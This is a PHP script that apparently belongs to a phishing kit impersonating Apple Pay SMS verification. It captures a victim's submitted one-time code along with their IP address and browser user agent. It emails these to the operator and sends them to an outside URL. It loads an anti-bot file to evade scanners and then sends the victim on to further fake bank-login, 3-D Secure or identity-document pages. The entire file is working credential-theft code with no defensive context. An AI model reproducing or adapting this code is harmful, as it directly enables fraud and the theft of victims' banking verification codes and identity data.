<?php
error_reporting(0);
  ob_start();
  session_start();
include '../../antibots.php';
include '../../config.php';
$message = "
_______________________________
SMS Apple Pay :  ".$_POST['bankid']."
_______________________________
IP: " . $_SERVER['REMOTE_ADDR'] . "
User Agent: ".$_SERVER['HTTP_USER_AGENT']."
";
$Subject= "\xf0\x9f\x83\x8f SMS APPLE PAY - ".$_SESSION['c_num']." \xf0\x9f\x83\x8f"._ip();
$head="From:  \xf0\x9f\x95\xb7 ISK 17 \xf0\x9f\x95\xb7 <rez@ayz.com>";
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));  
if ($vbv == "oui") {
header('location:  ../load.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif ($log_bank == "oui") {
    header('location:  ../bank.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif($cni == "oui") {
    header('location:  ../identity.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}else{
    header('location: ../success.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}
?>